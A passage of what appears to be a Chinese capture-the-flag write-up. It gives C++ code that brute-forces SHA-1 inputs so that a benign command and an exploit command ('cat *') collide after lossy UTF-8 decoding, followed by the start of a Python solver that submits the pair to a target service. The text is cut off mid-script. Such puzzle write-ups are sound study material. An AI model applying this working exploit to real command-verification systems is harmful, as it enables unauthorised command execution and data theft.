class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// g++ -std=c++17 -march=native -O3 -lcrypto -lpthread gewalt.cpp -o gewalt</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/sha.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> num_threads = <span class="built_in">std</span>::thread::hardware_concurrency();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">hash</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> <span class="keyword">const</span>&amp; s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SHA_CTX ctx;</span><br><span class="line">    <span class="keyword">if</span> (!SHA1_Init(&amp;ctx)) <span class="keyword">throw</span>;</span><br><span class="line">    <span class="keyword">if</span> (!SHA1_Update(&amp;ctx, s.data(), s.length())) <span class="keyword">throw</span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">d</span><span class="params">(SHA_DIGEST_LENGTH, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!SHA1_Final((<span class="keyword">uint8_t</span> *) &amp;d[<span class="number">0</span>], &amp;ctx)) <span class="keyword">throw</span>;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="built_in">std</span>::u32string <span class="title">kapot</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> <span class="keyword">const</span>&amp; s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::u32string <span class="title">r</span><span class="params">(s.size(), <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">size_t</span> o = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; s.length(); ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> T = [](<span class="keyword">uint8_t</span> c) &#123;</span><br><span class="line">            <span class="keyword">return</span> (c &lt; <span class="number">0x80</span>)         ? <span class="number">1</span>   <span class="comment">/* ASCII */</span></span><br><span class="line">                 : (c &amp; <span class="number">0xc0</span>) == <span class="number">0x80</span> ? <span class="number">0</span>   <span class="comment">/* continuation */</span></span><br><span class="line">                 : (c &amp; <span class="number">0xe0</span>) == <span class="number">0xc0</span> ? <span class="number">2</span>   <span class="comment">/* 2-byte chunk */</span></span><br><span class="line">                 : (c &amp; <span class="number">0xf0</span>) == <span class="number">0xe0</span> ? <span class="number">3</span>   <span class="comment">/* 3-byte chunk */</span></span><br><span class="line">                 : (c &amp; <span class="number">0xf8</span>) == <span class="number">0xf0</span> ? <span class="number">4</span>   <span class="comment">/* 4-byte chunk */</span></span><br><span class="line">                 : <span class="number">-1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint32_t</span> c = s[i++];</span><br><span class="line">        <span class="keyword">auto</span> cont = [&amp;]() &#123; c = (c &lt;&lt; <span class="number">6</span>) | (s[i++] &amp; <span class="number">0x3f</span>); &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (T(c)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">case</span>  <span class="number">0</span>:</span><br><span class="line">        invalid: c = <span class="number">0xfffd</span>; <span class="comment">/* fall through */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span>  <span class="number">1</span>:</span><br><span class="line">        valid:   r[o++] = c; <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span>  <span class="number">2</span>:</span><br><span class="line">                 <span class="keyword">if</span> (c &amp;= <span class="number">0x1f</span>, i+<span class="number">0</span> &gt;= s.size() || T(s[i+<span class="number">0</span>]))</span><br><span class="line">                     <span class="keyword">goto</span> invalid;</span><br><span class="line">                 <span class="keyword">goto</span> one;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span>  <span class="number">3</span>:</span><br><span class="line">                 <span class="keyword">if</span> (c &amp;= <span class="number">0x1f</span>, i+<span class="number">1</span> &gt;= s.size() || T(s[i+<span class="number">0</span>]) || T(s[i+<span class="number">1</span>]))</span><br><span class="line">                     <span class="keyword">goto</span> invalid;</span><br><span class="line">                 <span class="keyword">goto</span> two;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span>  <span class="number">4</span>:</span><br><span class="line">                 <span class="keyword">if</span> (c &amp;= <span class="number">0x1f</span>, i+<span class="number">2</span> &gt;= s.size() || T(s[i+<span class="number">0</span>]) || T(s[i+<span class="number">1</span>]) || T(s[i+<span class="number">2</span>]))</span><br><span class="line">                     <span class="keyword">goto</span> invalid;</span><br><span class="line">                 cont();</span><br><span class="line">        two:     cont();</span><br><span class="line">        one:     cont();</span><br><span class="line">                 <span class="keyword">goto</span> valid;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r.resize(o);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::atomic&lt;<span class="keyword">uint64_t</span>&gt; hcount = <span class="number">0</span>, kcount = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="built_in">std</span>::u32string, <span class="built_in">std</span>::<span class="built_in">string</span>&gt; <span class="keyword">tab_t</span>;</span><br><span class="line"><span class="keyword">tab_t</span> tab0, tab1;</span><br><span class="line"><span class="built_in">std</span>::mutex mtx;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">uint8_t</span>,4&gt; ip;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> cmd0, cmd1;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">stuffer_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">size_t</span>,4&gt; cnts;</span><br><span class="line">        <span class="keyword">size_t</span> step;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> cmd;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="keyword">stuffer_t</span>(<span class="keyword">size_t</span> t, <span class="keyword">size_t</span> s, <span class="built_in">std</span>::<span class="built_in">string</span> c) : cnts&#123;t&#125;, step(s), cmd(c) &#123;&#125;</span><br><span class="line">        <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">operator</span><span class="params">()</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">//XXX this is by far not the most efficient way of doing this, but yeah</span></span><br><span class="line">            <span class="keyword">if</span> (++cnts[<span class="number">3</span>] &gt;= cnts[<span class="number">0</span>]) &#123;</span><br><span class="line">                cnts[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (++cnts[<span class="number">2</span>] &gt;= cnts[<span class="number">0</span>]) &#123;</span><br><span class="line">                    cnts[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">if</span> (++cnts[<span class="number">1</span>] &gt;= cnts[<span class="number">0</span>]) &#123;</span><br><span class="line">                        cnts[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">                        cnts[<span class="number">0</span>] += step;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">stringstream</span> o;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">                o &lt;&lt; (i ? <span class="string">&quot;.&quot;</span> : <span class="string">&quot;&quot;</span>)</span><br><span class="line">                  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">string</span>(cnts[i], <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                  &lt;&lt; (<span class="keyword">unsigned</span>) ip[i];</span><br><span class="line">            o &lt;&lt; <span class="string">&quot;|&quot;</span> &lt;&lt; cmd;</span><br><span class="line">            <span class="keyword">return</span> o.str();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">go</span><span class="params">(<span class="keyword">size_t</span> tid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//XXX tid stuff is a hack, but YOLO</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> one = tid &amp; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">stuffer_t</span> <span class="title">next</span><span class="params">(tid &gt;&gt; <span class="number">1</span>, (num_threads + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>, one ? cmd1 : cmd0)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">tab_t</span>&amp; mytab = one ? tab1 : tab0;</span><br><span class="line">    <span class="keyword">tab_t</span>&amp; thtab = one ? tab0 : tab1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> myhcount = <span class="number">0</span>, mykcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> r = next();</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            ++myhcount;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> h = hash(r);</span><br><span class="line">            <span class="keyword">if</span> ((h.size()+<span class="number">3</span>)/<span class="number">4</span> &lt; (<span class="keyword">size_t</span>) <span class="built_in">std</span>::count_if(h.begin(), h.end(),</span><br><span class="line">                                            [](<span class="keyword">unsigned</span> <span class="keyword">char</span> c) &#123; <span class="keyword">return</span> c &lt; <span class="number">0x80</span>; &#125;))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            ++mykcount;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> k = kapot(h);</span><br><span class="line">            <span class="keyword">if</span> (k.size() &gt; <span class="number">3</span> + (<span class="keyword">size_t</span>) <span class="built_in">std</span>::count(k.begin(), k.end(), <span class="number">0xfffd</span>))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="built_in">std</span>::lock_guard&lt;<span class="built_in">std</span>::mutex&gt; <span class="title">lck</span><span class="params">(mtx)</span></span>;</span><br><span class="line"></span><br><span class="line">            hcount += myhcount, myhcount = <span class="number">0</span>;</span><br><span class="line">            kcount += mykcount, mykcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (thtab.find(k) != thtab.end()) &#123;</span><br><span class="line"></span><br><span class="line">                mytab[k] = r;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;\r\x1b[K&quot;</span></span><br><span class="line">                          &lt;&lt; <span class="string">&quot;\x1b[32m&quot;</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; tab0[k] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">                          &lt;&lt; tab1[k] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;\x1b[0m&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="built_in">std</span>::hex;</span><br><span class="line">                <span class="keyword">bool</span> first = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">uint32_t</span> c: k)</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; (first ? first = <span class="literal">false</span>, <span class="string">&quot;&quot;</span> : <span class="string">&quot; &quot;</span>) &lt;&lt; c;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="built_in">std</span>::dec &lt;&lt; <span class="string">&quot;hash count:  \x1b[35m&quot;</span> &lt;&lt; hcount &lt;&lt; <span class="string">&quot;\x1b[0m&quot;</span>;</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">stringstream</span> s;</span><br><span class="line">                    s &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>) &lt;&lt; <span class="built_in">log</span>(hcount|<span class="number">1</span>)/<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot; (2^\x1b[35m&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">5</span>) &lt;&lt; s.str() &lt;&lt; <span class="string">&quot;\x1b[0m&quot;</span> &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;kapot count: &quot;</span> &lt;&lt; <span class="string">&quot;\x1b[35m&quot;</span> &lt;&lt; kcount &lt;&lt; <span class="string">&quot;\x1b[0m&quot;</span>;</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">stringstream</span> s;</span><br><span class="line">                    s &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>) &lt;&lt; <span class="built_in">log</span>(kcount|<span class="number">1</span>)/<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot; (2^\x1b[35m&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">5</span>) &lt;&lt; s.str() &lt;&lt; <span class="string">&quot;\x1b[0m)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;table sizes: \x1b[35m&quot;</span></span><br><span class="line">                          &lt;&lt; tab0.size() &lt;&lt; <span class="string">&quot;\x1b[0m \x1b[35m&quot;</span></span><br><span class="line">                          &lt;&lt; tab1.size() &lt;&lt; <span class="string">&quot;\x1b[0m&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (mytab.size() &lt; (<span class="number">1</span> &lt;&lt; <span class="number">20</span>))</span><br><span class="line">                mytab[k] = r;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        hcount += myhcount;</span><br><span class="line">        kcount += mykcount;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="function"><span class="built_in">std</span>::lock_guard&lt;<span class="built_in">std</span>::mutex&gt; <span class="title">lck</span><span class="params">(mtx)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;\r\x1b[K&quot;</span>;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;hash count: \x1b[35m&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">12</span>) &lt;&lt; hcount &lt;&lt; <span class="string">&quot;\x1b[0m &quot;</span>;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">stringstream</span> s;</span><br><span class="line">                s &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>) &lt;&lt; <span class="built_in">log</span>(hcount|<span class="number">1</span>)/<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;(2^\x1b[35m&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">5</span>) &lt;&lt; s.str() &lt;&lt; <span class="string">&quot;\x1b[0m) | &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;kapot count: \x1b[35m&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">12</span>) &lt;&lt; kcount &lt;&lt; <span class="string">&quot;\x1b[0m &quot;</span>;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">stringstream</span> s;</span><br><span class="line">                s &lt;&lt; <span class="built_in">std</span>::fixed &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">2</span>) &lt;&lt; <span class="built_in">log</span>(kcount|<span class="number">1</span>)/<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;(2^\x1b[35m&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">5</span>) &lt;&lt; s.str() &lt;&lt; <span class="string">&quot;\x1b[0m) | &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;tables: \x1b[35m&quot;</span></span><br><span class="line">                      &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">9</span>) &lt;&lt; tab0.size() &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">                      &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">9</span>) &lt;&lt; tab1.size() &lt;&lt; <span class="string">&quot;\x1b[0m &quot;</span></span><br><span class="line">                      &lt;&lt; <span class="built_in">std</span>::flush;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::this_thread::sleep_for(<span class="built_in">std</span>::chrono::milliseconds(<span class="number">100</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;\x1b[31mneed IPv4 in argv[1]\x1b[0m&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="built_in">std</span>::<span class="built_in">stringstream</span> <span class="title">ss</span><span class="params">(argv[<span class="number">1</span>])</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; v: ip) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">string</span> s;</span><br><span class="line">            <span class="built_in">std</span>::getline(ss, s, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            <span class="keyword">int</span> n = <span class="built_in">std</span>::atoi(s.c_str());</span><br><span class="line">            <span class="keyword">if</span> (n &lt; <span class="built_in">std</span>::numeric_limits&lt;<span class="keyword">uint8_t</span>&gt;::min() || n &gt; <span class="built_in">std</span>::numeric_limits&lt;<span class="keyword">uint8_t</span>&gt;::max())</span><br><span class="line">                <span class="keyword">goto</span> bad_ip;</span><br><span class="line">            v = n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ss) &#123;</span><br><span class="line">bad_ip:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;\x1b[31mbad IPv4 given?\x1b[0m&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;\x1b[31mneed commands in argv[2] and argv[3]\x1b[0m&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cmd0 = argv[<span class="number">2</span>];</span><br><span class="line">    cmd1 = argv[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::thread <span class="title">status_thread</span><span class="params">(status)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::thread&gt; ts;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; num_threads; ++i)</span><br><span class="line">        ts.push_back(<span class="built_in">std</span>::thread(go, i));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; t: ts)</span><br><span class="line">        t.join();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å¯èƒ½ä¼šæ‰¾ä¸åˆ° <code>lcrypto</code>ï¼Œç¼–è¯‘å‘½ä»¤åŠ ä¸Š lcrypto è·¯å¾„ï¼ˆæˆ‘æœ¬åœ°æ˜¯ /usr/local/opt/openssl/libï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -std=c++17 -march=native -O3 -lcrypto -lpthread gewalt.cpp -o gewalt -L/usr/<span class="built_in">local</span>/opt/openssl/lib</span><br></pre></td></tr></table></figure><p>ä¸ go äº¤äº’çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys, requests, subprocess</span><br><span class="line"></span><br><span class="line">benign_cmd = <span class="string">&#x27;ls -l&#x27;</span></span><br><span class="line">exploit_cmd = <span class="string">&#x27;cat *&#x27;</span></span><br><span class="line"></span><br><span class="line">ip, port = sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>]</span><br><span class="line">url = <span class="string">&#x27;http://&#123;&#125;:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(ip, port)</span><br><span class="line"></span><br><span class="line">my_ip = requests.get(url + <span class="string">&#x27;/ip&#x27;</span>).text</span><br><span class="line">print(<span class="string">&#x27;[+] IP: &#x27;</span> + my_ip)</span><br><span class="line"></span><br><span class="line">o = subprocess.check_output([<span class="string">&#x27;./gewalt&#x27;</span>, my_ip, benign_cmd, exploit_cmd])</span><br><span class="line">print(<span class="string">&#x27;[+] gewalt:&#x27;</span> + o.decode())</span><br><span class="line"></span><br><span class="line">payload = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> o.decode().splitlines():</span><br><span class="line">    ip, cmd = l.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">    payload[<span class="string">&#x27;benign&#x27;</span> <span class="keyword">if</span> cmd == benign_cmd <span class="keyword">else</span> <span class="string">&#x27;pwn&#x27;</span>] = ip, cmd</span><br><span class="line"></span><br><span 